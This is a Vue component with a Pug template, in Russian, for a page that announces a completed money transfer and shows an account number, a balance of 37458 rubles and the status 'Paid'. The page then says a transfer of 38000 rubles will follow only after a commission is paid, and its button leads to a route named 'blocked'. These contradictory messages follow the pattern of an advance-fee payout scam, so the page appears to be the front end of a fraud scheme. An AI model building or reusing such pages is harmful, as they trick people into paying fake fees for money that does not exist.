<template lang='pug'>
    .step
        .step__top
            .step__top-left
                span.step__top-icon
                    success-icon(height="140")

            .step__top-right
                .step__top-heading ЗАЯВКА НА ПЕРЕВОД УСПЕШНО ОФОРМЛЕНА

                .step__top-desc Оставайтесь на странице во время работы системы

                .step__top-t1.step__top-t3 СРЕДСТВА УСПЕШНО ОТПРАВЛЕНЫ!

        .step__bot
            .step__bot-header ВЫВОД СРЕДСТВ

            .step__bot-body
                ul.step__bot-balans.list
                    li.step__bot-account
                        span.step__bot-account-bg
                            img(src="~img/images/account-img.svg")

                        span.step__bot-account-title Счет№:

                        span.step__bot-account-value 1773569865 

                    li.step__bot-sum
                        span.step__bot-sum-bg
                            img(src="~img/images/coint-img.svg")

                        span.step__bot-sum-title Баланс счета:

                        span.step__bot-sum-value 37458 руб

                p.step__bot-t1 Статус: <span class="green"> Выплачено</span>

                p.step__bot-t2 На указанный вами счет отправлен денежный перевод. <br />Поступление средств моментальное. Если вам еще не пришли <br />деньги, нажмите кнопку "Поиск перевода".

                router-link.step__bot-submit.link(:to="{ name: 'blocked' }") ПОДКЛЮЧИТЬ УСЛУГУ

                .step__bot-footer Сразу после оплаты комиссии, <br />вам будет отправлен перевод в сумме: 38000 руб.
</template>

<script src='./script.js'></script>

<style lang='scss' src='../firstStep/style.scss'></style>